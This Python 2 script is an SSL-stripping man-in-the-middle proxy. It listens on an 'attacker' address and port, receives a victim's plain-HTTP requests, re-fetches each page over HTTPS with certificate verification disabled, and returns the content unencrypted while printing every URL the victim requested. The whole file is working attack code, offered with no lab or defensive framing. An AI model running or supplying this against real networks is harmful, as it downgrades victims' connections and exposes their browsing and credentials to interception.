from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import httplib
import ssl
import urlparse
import gzip
from StringIO import StringIO
import errno

ATTACKER_IP = "0.0.0.0"
ATTACKER_PORT = 8080


class SSLStripProxy(BaseHTTPRequestHandler):
	def __init__(self, request, client_address, server):
		BaseHTTPRequestHandler.__init__(self, request, client_address, server)
	
	def do_GET(self):
		host = self.headers.getheader('Host', '')
		url = "https://{}{}".format(host, self.path)
		print "[+] Victim requested:", url

		try:
			parsed = urlparse.urlparse(url)
			conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
			path = parsed.path or "/"
			if parsed.query:
				path += "?" + parsed.query

			# Tell server not to gzip so easier to handle
			headers = {
				"User-Agent": "Mozilla/5.0",
				"Accept": "*/*",
				"Accept-Encoding": "identity",  # Request no compression
				"Host": host
			}

			conn.request("GET", path, headers=headers)
			resp = conn.getresponse()
			content = resp.read()
			content_encoding = resp.getheader('Content-Encoding', '')

			# If gzip, decompress before sending to victim
			if content_encoding == 'gzip':
				buf = StringIO(content)
				f = gzip.GzipFile(fileobj=buf)
				content = f.read()

			self.send_response(resp.status)
			content_type = resp.getheader('Content-Type', 'text/html')
			self.send_header("Content-type", content_type)
			self.send_header("Content-Length", str(len(content)))
			self.end_headers()

			try:
				self.wfile.write(content)
				self.wfile.flush()
			except IOError as e:
				if e.errno == errno.EPIPE:
					print "[!] Broken pipe: client disconnected early"
				else:
					raise

		except Exception as e:
			self.send_error(502, "SSLStrip failed: {}".format(e))

	def do_HEAD(self):
		host = self.headers.getheader('Host', '')
		url = "https://{}{}".format(host, self.path)
		print "[+] Victim sent HEAD request:", url

		try:
			parsed = urlparse.urlparse(url)
			conn = httplib.HTTPSConnection(parsed.hostname, parsed.port or 443, context=ssl._create_unverified_context())
			path = parsed.path or "/"
			if parsed.query:
				path += "?" + parsed.query

			headers = {
				"User-Agent": "Mozilla/5.0",
				"Accept": "*/*",
				"Accept-Encoding": "identity",
				"Host": host
			}

			conn.request("HEAD", path, headers=headers)
			resp = conn.getresponse()
			content_type = resp.getheader('Content-Type', 'text/html')
			content_length = resp.getheader('Content-Length', '0')

			self.send_response(resp.status)
			self.send_header("Content-type", content_type)
			self.send_header("Content-Length", content_length)
			self.end_headers()

		except Exception as e:
			self.send_error(502, "SSLStrip failed (HEAD): {}".format(e))


if __name__ == "__main__":
    print "[*] Starting SSLStrip proxy on port " + str(str(ATTACKER_PORT))
    httpd = HTTPServer((ATTACKER_IP, ATTACKER_PORT), SSLStripProxy)
    httpd.serve_forever()
